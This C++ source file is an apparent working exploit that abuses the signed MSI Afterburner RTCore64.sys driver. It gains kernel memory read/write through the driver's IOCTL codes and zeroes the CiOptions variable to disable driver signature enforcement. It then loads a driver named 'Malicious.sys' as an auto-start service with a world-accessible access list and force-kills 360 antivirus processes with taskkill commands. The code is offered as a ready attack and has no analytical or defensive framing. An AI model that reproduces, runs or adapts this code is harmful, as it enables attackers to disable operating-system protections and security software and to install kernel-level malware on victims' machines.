#include "global.h"
#include <aclapi.h>
#include <Psapi.h>
#include <iostream>

#if !defined(PRINT_ERROR_AUTO)
#define PRINT_ERROR_AUTO(func) (wprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))
#endif

struct RTCORE64_MEMORY_READ
{
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE
{
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;


DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address)
{
    RTCORE64_MEMORY_READ MemoryRead {};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device, RTCORE64_MEMORY_READ_CODE, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead),
                    &BytesReturned, nullptr);

    return MemoryRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value)
{
    RTCORE64_MEMORY_READ MemoryRead {};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device, RTCORE64_MEMORY_WRITE_CODE, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead),
                    &BytesReturned, nullptr);
}


DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address)
{
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address)
{
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value)
{
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}

void Log(const char* Message, ...)
{
    const auto file = stderr;

    va_list Args;
    va_start(Args, Message);
    std::vfprintf(file, Message, Args);
    std::fputc('\n', file);
    va_end(Args);
}

BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle)
{
    BOOL status = FALSE;
    DWORD dwSizeNeeded;
    PSECURITY_DESCRIPTOR oldSd, newSd;
    SECURITY_DESCRIPTOR dummySdForXP;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    EXPLICIT_ACCESS ForEveryOne = {SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE |
                                       SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP |
                                       SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
                                   SET_ACCESS,
                                   NO_INHERITANCE,
                                   {NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}};
    if (!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) &&
        (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
    {
        if (oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded))
        {
            if (QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded))
            {
                if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0,
                                             (PSID*)&ForEveryOne.Trustee.ptstrName))
                {
                    if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) ==
                        ERROR_SUCCESS)
                    {
                        status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
                        LocalFree(newSd);
                    }
                    FreeSid(ForEveryOne.Trustee.ptstrName);
                }
            }
            LocalFree(oldSd);
        }
    }
    return status;
}

DWORD service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType,
                      BOOL startIt)
{
    BOOL status = FALSE;
    SC_HANDLE hSC = NULL, hS = NULL;

    if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))
    {
        if (hS = OpenService(hSC, serviceName, SERVICE_START))
        {
            wprintf(L"[+] \'%s\' service already registered\n", serviceName);
        }
        else
        {
            if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
            {
                wprintf(L"[*] \'%s\' service not present\n", serviceName);
                if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType,
                                       startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL))
                {
                    wprintf(L"[+] \'%s\' service successfully registered\n", serviceName);
                    if (status = kull_m_service_addWorldToSD(hS))
                        wprintf(L"[+] \'%s\' service ACL to everyone\n", serviceName);
                    else
                        printf("kull_m_service_addWorldToSD");
                }
                else
                    PRINT_ERROR_AUTO(L"CreateService");
            }
            else
                PRINT_ERROR_AUTO(L"OpenService");
        }
        if (hS)
        {
            if (startIt)
            {
                if (status = StartService(hS, 0, NULL))
                    wprintf(L"[+] \'%s\' service started\n", serviceName);
                else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
                    wprintf(L"[*] \'%s\' service already started\n", serviceName);
                else
                {
                    PRINT_ERROR_AUTO(L"StartService");
                }
            }
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    else
    {
        PRINT_ERROR_AUTO(L"OpenSCManager(create)");
        return GetLastError();
    }
    return 0;
}

HANDLE GetDriverHandle()
{
    HANDLE Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Device == INVALID_HANDLE_VALUE)
    {
        Log("[!] Unable to obtain a handle to the device object");
        return Device;
        exit;
    }
    else
    {
        Log("[+] Device object handle obtained: %p", Device);
        return Device;
    }
}

int main(int argc, char* argv[])
{
    const auto svcName = L"RTCore64";
    const auto svcName2 = L"malicious";
    const auto svcDesc = L"Micro-Star MSI Afterburner";
    const auto svcDesc2 = L"malicious";
    const wchar_t driverName[] = L"\\RTCore64.sys";
    const wchar_t driverName2[] = L"\\Malicious.sys";
    const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
    const auto pathSize2 = MAX_PATH + sizeof(driverName2) / sizeof(wchar_t);
    TCHAR driverPath[pathSize];
    TCHAR driverPath2[pathSize2];
    GetCurrentDirectory(pathSize, driverPath);
    wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));

    GetCurrentDirectory(pathSize2, driverPath2);
    wcsncat_s(driverPath2, driverName2, sizeof(driverName2) / sizeof(wchar_t));
    service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);

    PVOID CiOptionsAddress;
    NTSTATUS Status = AnalyzeCi(&CiOptionsAddress);
    printf("%llx\n", CiOptionsAddress);
    HANDLE device = GetDriverHandle();
    WriteMemoryPrimitive(device, 1, (DWORD64)CiOptionsAddress, 0);

    service_install(svcName2, svcDesc2, driverPath2, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);

    system("taskkill /IM QHActiveDefense.exe /F");
    system("taskkill /IM QHSafeTray.exe /F");
    system("taskkill /IM QHWatchdog.exe /F");
    system("taskkill /IM QHSafeMain.exe /F");
    system("taskkill /IM PromoUtil.exe /F");

    return 0;
}
